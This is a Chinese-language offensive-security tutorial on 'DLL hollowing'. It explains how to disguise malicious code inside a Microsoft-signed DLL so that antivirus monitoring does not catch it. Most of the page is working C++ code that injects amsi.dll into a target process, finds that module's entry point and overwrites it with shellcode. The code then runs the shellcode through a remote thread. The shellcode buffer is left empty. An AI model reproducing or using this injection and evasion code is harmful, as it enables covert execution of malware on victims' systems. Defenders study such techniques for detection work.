# DLL Hollowing

## 简介

模块镂空\(dll hollowing\)也是一种shellcode注入技术，原理和思路与process hollowing类似，通过合法的模块信息来伪装恶意代码，虽然我们可以用远程dll注入来完整注入整个恶意dll，但此类注入往往比较容易检测，我们需要往受害者主机上传入一个恶意dll，这样杀毒软件可以通过监控入windows/temp/等目录实现对远程dll注入的拦截，而模块镂空就不会存在这样的风险，因为我们镂空的往往是一个带有微软签名的dll，为了防止进程出错，我们并不能直接镂空一个进程空间中已存在的dll，需要先对目标进程远程注入一个系统合法dll，然后再镂空它，这样我们就获得了一个和windows模块相关联的shellcode环境。

## 实现思路

1. 远程注入一个系统dll\(原理参考[CreateRemoteThrea](createremotethread.md)的dll注入\)
2. 获取该模块在目标进程中的虚拟地址
3. 定位模块的入口点
4. 使用shellcode复写入口点
5. 创建远程线程

## 代码实现

```text
#include <iostream>
#include <Windows.h>
#include <psapi.h>

char shellcode[] = "";

int main(int argc, char* argv[])
{
	
	
	TCHAR ModuleName[] = L"C:\\windows\\system32\\amsi.dll";
	HMODULE hModules[256] = {};
	SIZE_T hModulesSize = sizeof(hModules);
	DWORD hModulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T hModulesCount = 0;
	CHAR rModuleName[128] = {};
	HMODULE rModule = NULL;

	// inject a benign DLL into remote process
	//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2924);

	LPVOID lprBuffer = VirtualAllocEx(hProcess, NULL, sizeof ModuleName, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, lprBuffer, (LPVOID)ModuleName, sizeof ModuleName, NULL);
	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	HANDLE dllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, lprBuffer, 0, NULL);
	WaitForSingleObject(dllThread, 1000);

	// find base address of the injected benign DLL in remote process
	EnumProcessModules(hProcess, hModules, hModulesSize, &hModulesSizeNeeded);
	hModulesCount = hModulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < hModulesCount; i++)
	{
		rModule = hModules[i];
		GetModuleBaseNameA(hProcess, rModule, rModuleName, sizeof(rModuleName));
		if (std::string(rModuleName).compare("amsi.dll") == 0)
		{
			break;
		}
	}

	// get DLL's AddressOfEntryPoint
	DWORD headerBufferSize = 0x1000;
	LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
	ReadProcessMemory(hProcess, rModule, peHeader, headerBufferSize, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peHeader;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + dosHeader->e_lfanew);
	LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);

	// write shellcode to DLL's AddressofEntryPoint
	WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);

	// execute shellcode from inside the benign DLL
	CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);

	return 0;
}
```

